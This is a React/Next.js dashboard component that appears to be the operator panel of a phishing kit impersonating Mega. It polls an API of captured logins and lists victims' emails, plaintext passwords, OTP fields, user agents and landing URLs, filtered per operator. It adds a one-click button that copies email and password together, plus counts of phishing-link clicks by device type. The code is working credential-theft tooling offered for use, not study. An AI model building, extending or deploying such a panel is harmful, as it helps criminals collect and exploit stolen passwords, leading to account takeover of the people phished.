'use client';

import { useEffect, useState } from "react";
import { MdKeyboardArrowRight, MdKeyboardArrowLeft, MdContentCopy, MdArrowDownward, MdArrowUpward } from "react-icons/md";
import { FaRegArrowAltCircleRight } from "react-icons/fa";
import Loader from "@/components/Loader";
import useSWR from "swr";
import { formatDistanceToNow } from "date-fns";
import toast from "react-hot-toast";
import { useRouter } from "next/navigation";
import { isLoggedIn } from "../utils/auth";


const ActiveLinksTable = () => {

  const router = useRouter()
  useEffect(() => {
    if (!isLoggedIn()) {
      router.push("/");  // Redirect to login if not logged in
    }
  }, []);
 
  const [currentPage, setCurrentPage] = useState(1);
  const [sortConfig, setSortConfig] = useState({ key: 'id', direction: 'ascending' });
  const [loading, setLoading] = useState(true);
  const [userDetails , setUserDetails ] = useState([]);
  const [loginUser,setLoginUser] = useState(null)
  const [userName ,setUserName ] = useState(null)

  useEffect(() => {
    const user = localStorage.getItem('login_user');
    setLoginUser(user)
  }, []);


  const fetcher = (url) => fetch(url).then((res) => res.json());
  const { data, error, isLoading } = useSWR("/api/mega_login", fetcher, {
    refreshInterval: 50,
  });

  const { data:name, isLoading:loadingName } = useSWR("/api/auth/signup", fetcher, {
    refreshInterval: 50,
  });

  

  useEffect(()=>{
    const filter = data?.data?.filter(value=>value?.logEmail === loginUser)
    setUserDetails(filter)

    const findName = name?.find(value => value.email === loginUser);
        setUserName(findName)
  },[data?.data,name])




  const itemsPerPage = 5;

  // Simulate loading completion
  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false);
    }, 500); // Optional delay to simulate loading

    return () => clearTimeout(timer);
  }, []);

  // Pagination
  
  const totalPages = Math.ceil(userDetails?.length / itemsPerPage);
  const startIndex = (currentPage - 1) * itemsPerPage;
  const currentItems = userDetails?.slice(startIndex, startIndex + itemsPerPage);

  const handlePageChange = (page) => {
    if (page >= 1 && page <= totalPages) {
      setCurrentPage(page);
    }
  };

  const handleSort = (key) => {
    let direction = 'ascending';
    if (sortConfig.key === key && sortConfig.direction === 'ascending') {
      direction = 'descending';
    }
    setSortConfig({ key, direction });

    const sortedLinks = [...userDetails].sort((a, b) => {
      if (a[key] < b[key]) return direction === 'ascending' ? -1 : 1;
      if (a[key] > b[key]) return direction === 'ascending' ? 1 : -1;
      return 0;
    });

    userDetails.splice(0, userDetails.length, ...sortedLinks);
  };

  const copyToClipboard = (value) => {
    navigator.clipboard.writeText(value).then(() => {
      toast.success(`Copied: ${value}`);
    });
  };


  const [deviceCounts, setDeviceCounts] = useState({
    mobile: 0,
    desktop: 0,
    tablet: 0,
    total: 0,
  });


  useEffect(() => {
    const fetchCounts = async () => {
      try {
        const res = await fetch("/api/get-visit-counts");
        const data = await res.json();
        const filter = data?.filter(value => value?.email === loginUser)
        // console.log(filter)

        // Aggregate device counts
        let mobile = 0,
          desktop = 0,
          tablet = 0,
          total=0;
          

          filter?.map((item) => {
          mobile += item.deviceCounts?.mobile || 0;
          desktop += item.deviceCounts?.desktop || 0;
          tablet += item.deviceCounts?.tablet || 0;
          total = mobile + desktop + tablet  || 0;
        });

        

        setDeviceCounts({ mobile, desktop, tablet,total });
      } catch (error) {
        console.error("Failed to fetch counts:", error);
      }
    };

    fetchCounts();
  }, []);

  const titles = ["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"];
  const counts = [deviceCounts.mobile, deviceCounts.desktop, deviceCounts.tablet, deviceCounts.total];

  if (isLoading || loadingName) return <Loader />;
  if (error) return <p>Error loading data: {error.message}</p>;

  return (
    <div className="p-4">
      <h3 className="pb-5 text-2xl font-normal text-gray-800">Dashboard</h3>
      <section className="flex items-center justify-between gap-5">
      {titles.map((title, index) => (
        <div className="w-full" key={index}>
          <div
            className={`flex justify-between rounded-md ${
              index === 0
                ? "bg-cyan-600"
                : index === 1
                ? "bg-[#28a745]"
                : index === 2
                ? "bg-[#ffc107]"
                : "bg-[#dc3545]"
            }`}
          >
            <div className="flex flex-col w-full gap-1">
              {/* Replace 0 with actual counts */}
              <h1 className="px-4 pt-5 text-3xl font-bold text-white">{counts[index]}</h1>
              <p className="px-4 pb-6 text-white">{title}</p>
              <button
                className={`flex items-center justify-center w-full gap-1 p-2 text-center text-white rounded-md ${
                  index === 0
                    ? "hover:bg-cyan-800 bg-cyan-700"
                    : index === 1
                    ? "hover:bg-[#196e2d] bg-[#1a7d31]"
                    : index === 2
                    ? "hover:bg-[#d1a72b] bg-yellow-400"
                    : "hover:bg-[#962934] bg-[#c92535]"
                }`}
              >
                More Info
                <FaRegArrowAltCircleRight />
              </button>
            </div>
          </div>
        </div>
      ))}
    </section>

      <div className="pt-10 overflow-x-auto rounded shadow-lg">
        <table className="min-w-full border border-collapse border-gray-300 rounded-lg">
          <thead>
            <tr className="text-left bg-gray-100">
              {["ID", "Sitename","Name","Email","password","Otp","UserAgent","Landing url", "Time", "Copy"].map((title, index) => (
                <th
                  key={index}
                  className="px-4 py-2 border border-gray-300 cursor-pointer"
                  onClick={() => title !== "Copy" && handleSort(title.toLowerCase())}
                >
                  <span className="flex items-center justify-between">
                    {title}
                    {sortConfig.key === title.toLowerCase() &&
                      (sortConfig.direction === "ascending" ? (
                        <MdArrowUpward size={20} />
                      ) : (
                        <MdArrowDownward size={20} />
                      ))}
                  </span>
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
  {currentItems?.length === 0 ? (
    <tr>
      <td colSpan="10" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
        No Data Available
      </td>
    </tr>
  ) : (
    currentItems?.reverse().map((link, index) => (
      <tr
        key={link._id}
        className={`${
          index % 2 === 0 ? "bg-gray-100" : "bg-white"
        } hover:bg-gray-200 transition-colors`}
      >
        <td className="px-4 py-2 border border-gray-300">{index + 1}</td>
        <td className="px-4 py-2 border border-gray-300">Mega</td>
        <td className="px-4 py-2 border border-gray-300">{userName?.name}</td>
        <td className="px-4 py-2 border border-gray-300">{link?.email}</td>
        <td className="px-4 py-2 border border-gray-300">{link?.password}</td>
        <td className="px-4 py-2 border border-gray-300"></td>
        <td className="px-4 py-2 border border-gray-300">{link?.userAgent}</td>
        <td className="px-4 py-2 border border-gray-300">{link?.url?.split("?")[0]}</td>
        <td className="px-4 py-2 border border-gray-300">
          {formatDistanceToNow(new Date(link?.createdAt), { addSuffix: true })}
        </td>
        <td className="px-4 py-2 text-center border border-gray-300">
          <button
            onClick={() => copyToClipboard(link?.email + " " + link?.password)}
            className="p-2 text-white bg-green-500 rounded hover:bg-green-600"
          >
            <MdContentCopy size={18} />
          </button>
        </td>
      </tr>
    ))
  )}
</tbody>


        </table>
      </div>

      {/* Pagination */}
      {
        currentItems?.length===0 ? "":
      
      <div className="flex items-center gap-4 mt-4">
        <button
          onClick={() => handlePageChange(currentPage - 1)}
          className={`${
            currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
          } text-white px-3 py-2 rounded`}
          disabled={currentPage === 1}
        >
          <MdKeyboardArrowLeft />
        </button>

        <div className="flex space-x-2">
          {Array.from({ length: totalPages }, (_, index) => (
            <button
              key={index}
              onClick={() => handlePageChange(index + 1)}
              className={`${
                currentPage === index + 1 ? "bg-blue-600 text-white" : "bg-white text-gray-700"
              } px-4 py-1 rounded hover:bg-blue-500 hover:text-white`}
            >
              {index + 1}
            </button>
          ))}
        </div>

        <button
          onClick={() => handlePageChange(currentPage + 1)}
          className={`${
            currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
          } text-white px-3 py-2 rounded`}
          disabled={currentPage === totalPages}
        >
          <MdKeyboardArrowRight />
        </button>
      </div>
      }
    </div>
  );
};

export default ActiveLinksTable;
